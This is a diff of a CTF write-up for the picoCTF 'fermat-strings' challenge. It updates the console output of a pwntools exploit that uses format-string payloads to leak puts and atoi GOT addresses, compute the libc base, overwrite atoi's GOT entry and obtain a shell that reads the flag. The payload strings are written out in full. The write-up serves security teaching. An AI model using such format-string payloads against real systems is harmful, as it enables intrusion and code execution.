@@ -501,7 +501,7 @@ io.interactive()
 This script combines the main building blocks we saw earlier, with some minor adjustments for performing the steps together instead of discretely. The output we get is:
 
 ```console
-──(user@kali)-[/media/sf_CTFs/pico/fermat-strings]
+┌──(user@kali)-[/media/sf_CTFs/pico/fermat-strings]
 └─$ python3 exploit.py
 [*] '/media/sf_CTFs/pico/fermat-strings/chall'
     Arch:     amd64-64-little
@@ -509,89 +509,90 @@ This script combines the main building blocks we saw earlier, with some minor ad
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE (0x400000)
-[+] Opening connection to mars.picoctf.net on port 31929: Done
-[*] puts(): 0x00601018
-[+] Opening connection to mars.picoctf.net on port 31929: Done
-00000000  43 61 6c 63  75 6c 61 74  69 6e 67 20  66 6f 72 20  │Calc│ulat│ing │for │
-00000010  41 3a 20 31  31 31 5f a0  95 dc 47 e3  7f 2e 30 97  │A: 1│11_·│··G·│·.0·│
-00000020  d8 47 e3 7f  2e 20 20 20  20 20 20 20  20 20 20 20  │·G··│.   │    │    │
-00000030  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
-*
-00000830  20 20 20 20  20 20 d8 20  20 20 20 20  20 20 20 0e  │    │  · │    │   ·│
-00000840  20 61 6e 64  20 42 3a 20  31 31 31 31  31 31 31 5f  │ and│ B: │1111│111_│
-00000850  18 10 60 0a                                         │··`·│
-00000854
-0x7fe347dc95a0
-0x7fe347d89730
 [*] '/media/sf_CTFs/pico/fermat-strings/libc6_2.31-0ubuntu9.1_amd64.so'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      PIE enabled
-00000000  43 61 6c 63  75 6c 61 74  69 6e 67 20  66 6f 72 20  │Calc│ulat│ing │for │
-00000010  41 3a 20 31  31 31 5f 20  20 20 20 20  20 20 20 20  │A: 1│11_ │    │    │
-00000020  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
-*
-00000100  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 d8  │    │    │    │   ·│
-00000110  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
-[*] '/media/sf_CTFs/pico/fermat-strings/chall'
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
 [+] Opening connection to mars.picoctf.net on port 31929: Done
-[*] puts(): 0x00601018
+[*] puts() GOT address: 0x601018
+[*] atoi() GOT address: 0x601058
 [+] Opening connection to mars.picoctf.net on port 31929: Done
-00000000  43 61 6c 63  75 6c 61 74  69 6e 67 20  66 6f 72 20  │Calc│ulat│ing │for │
-00000010  41 3a 20 31  31 31 5f a0  95 dc 47 e3  7f 2e 30 97  │A: 1│11_·│··G·│·.0·│
-00000020  d8 47 e3 7f  2e 20 20 20  20 20 20 20  20 20 20 20  │·G··│.   │    │    │
-00000030  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
-*
-00000830  20 20 20 20  20 20 d8 20  20 20 20 20  20 20 20 0e  │    │  · │    │   ·│
-00000840  20 61 6e 64  20 42 3a 20  31 31 31 31  31 31 31 5f  │ and│ B: │1111│111_│
-00000850  18 10 60 0a                                         │··`·│
-00000854
-0x7fe347dc95a0
-0x7fe347d89730
-[*] '/media/sf_CTFs/pico/fermat-strings/libc6_2.31-0ubuntu9.1_amd64.so'
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      PIE enabled
-00000000  43 61 6c 63  75 6c 61 74  69 6e 67 20  66 6f 72 20  │Calc│ulat│ing │for │
-00000010  41 3a 20 31  31 31 5f 20  20 20 20 20  20 20 20 20  │A: 1│11_ │    │    │
-00000020  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
-*
-00000100  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 d8  │    │    │    │   ·│
-00000110  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
-*
-00000140  20 20 20 20  20 20 ee 20  20 20 20 20  20 20 20 20  │    │  · │    │    │
-00000150  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
-*
-00000170  20 20 20 00  20 20 20 20  20 20 20 20  20 20 ff 20  │   ·│    │    │  · │
-00000180  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
-*
-000001d0  20 20 20 20  20 20 20 20  f0 20 20 20  20 20 20 20  │    │    │·   │    │
-000001e0  20 20 e8 20  61 6e 64 20  42 3a 20 31  31 31 31 31  │  · │and │B: 1│1111│
-000001f0  31 31 5f 58  10 60 0a                               │11_X│·`·│
-000001f7
+[*] Sending:
+    A:
+    b'111_%43$s.%44$s.%2066c%45$lln%9c%46$hhn'
+    B:
+    00000000  31 31 31 31  31 31 31 5f  18 10 60 00  00 00 00 00  │1111│111_│··`·│····│
+    00000010  58 10 60 00  00 00 00 00  40 10 60 00  00 00 00 00  │X·`·│····│@·`·│····│
+    00000020  42 10 60 00  00 00 00 00                            │B·`·│····│
+    00000028
+[*] Received:
+    00000000  a0 55 2d a9  c4 7f 2e 30  57 29 a9 c4  7f 2e 20 20  │·U-·│··.0│W)··│·.  │
+    00000010  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+    *
+    00000810  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 d8  │    │    │    │   ·│
+    00000820  20 20 20 20  20 20 20 20  ae                        │    │    │·│
+    00000829
+[*] puts() runtime address: 0x7fc4a92d55a0
+[*] atoi() runtime address: 0x7fc4a9295730
+[*] LibC base address: 0x7fc4a924e000
+[*] Sending:
+    A:
+    b'111_%249c%43$lln%26c%44$hhn%10c%45$hhn%75c%46$hhn%42c%47$hhn%27c%48$hhn'
+    B:
+    00000000  31 31 31 31  31 31 31 5f  58 10 60 00  00 00 00 00  │1111│111_│X·`·│····│
+    00000010  5a 10 60 00  00 00 00 00  59 10 60 00  00 00 00 00  │Z·`·│····│Y·`·│····│
+    00000020  5d 10 60 00  00 00 00 00  5b 10 60 00  00 00 00 00  │]·`·│····│[·`·│····│
+    00000030  5c 10 60 00  00 00 00 00                            │\·`·│····│
+    00000038
+[*] Received:
+    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+[*] Received:
+    00000000  a0 55 2d a9  c4 7f 2e 30  57 29 a9 c4  7f 2e 20 20  │·U-·│··.0│W)··│·.  │
+    00000010  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+    *
+    00000810  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 d8  │    │    │    │   ·│
+    00000820  20 20 20 20  20 20 20 20  ae                        │    │    │·│
+    00000829
+[*] puts() runtime address: 0x7fc4a92d55a0
+[*] atoi() runtime address: 0x7fc4a9295730
+[*] LibC base address: 0x7fc4a924e000
+[*] Sending:
+    A:
+    b'111_%249c%43$lln%26c%44$hhn%10c%45$hhn%75c%46$hhn%42c%47$hhn%27c%48$hhn'
+    B:
+    00000000  31 31 31 31  31 31 31 5f  58 10 60 00  00 00 00 00  │1111│111_│X·`·│····│
+    00000010  5a 10 60 00  00 00 00 00  59 10 60 00  00 00 00 00  │Z·`·│····│Y·`·│····│
+    00000020  5d 10 60 00  00 00 00 00  5b 10 60 00  00 00 00 00  │]·`·│····│[·`·│····│
+    00000030  5c 10 60 00  00 00 00 00                            │\·`·│····│
+    00000038
+[*] Received:
+    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+    *
+    000000f0  20 20 20 20  20 20 20 20  d8 20 20 20  20 20 20 20  │    │    │·   │    │
+    00000100  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+    00000110  20 20 8e 20  20 20 20 20  20 20 20 20  00 20 20 20  │  · │    │    │·   │
+    00000120  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+    *
+    00000160  20 20 20 20  20 20 20 ff  20 20 20 20  20 20 20 20  │    │   ·│    │    │
+    00000170  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+    *
+    00000190  20 90 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │ ·  │    │    │    │
+    000001a0  20 20 20 20  20 20 20 20  20 20 20 20  e8           │    │    │    │·│
+    000001ad
+[*] Sending:
+    A:
+    /bin/sh
+    B:
+    00000000  64 75 6d 6d  79                                     │dumm│y│
+    00000005
 [*] Switching to interactive mode
-Welcome to Fermat\'s Last Theorem as a service
-A: $ /bin/sh
-B: $ 1
-$ ls
-flag.txt
-run
 $ ls
 flag.txt
 run
 $ cat flag.txt
 picoCTF{f3rm4t_pwn1ng_s1nc3_th3_17th_c3ntury}
-[*] Got EOF while reading in interactive
-$
 ```
 
 The flag: `picoCTF{f3rm4t_pwn1ng_s1nc3_th3_17th_c3ntury}`
